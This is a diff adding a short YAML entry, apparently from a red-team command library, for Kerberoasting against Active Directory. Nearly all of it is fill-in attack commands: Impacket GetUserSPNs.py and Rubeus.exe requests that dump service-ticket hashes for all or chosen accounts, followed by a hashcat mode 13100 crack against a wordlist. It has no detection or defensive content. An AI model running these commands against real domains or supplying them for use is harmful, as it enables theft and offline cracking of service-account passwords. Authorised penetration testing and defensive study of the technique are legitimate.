@@ -1,0 +1,19 @@
+name: Kerberoasting
+description: Request TGS tickets for accounts with SPNs and crack offline
+commands:
+- '# Impacket - request all SPN tickets'
+- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>'
+- ''
+- '# Impacket - target specific user'
+- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>' -target-user '<TARGET_USER>'
+- ''
+- '# Rubeus - all SPNs'
+- Rubeus.exe kerberoast /outfile:hashes.txt
+- ''
+- '# Rubeus - target specific user'
+- Rubeus.exe kerberoast /user:<TARGET_USER> /outfile:hashes.txt
+- ''
+- '# Crack with hashcat'
+- hashcat -m 13100 hashes.txt wordlist.txt
+opsec: []
+references: []
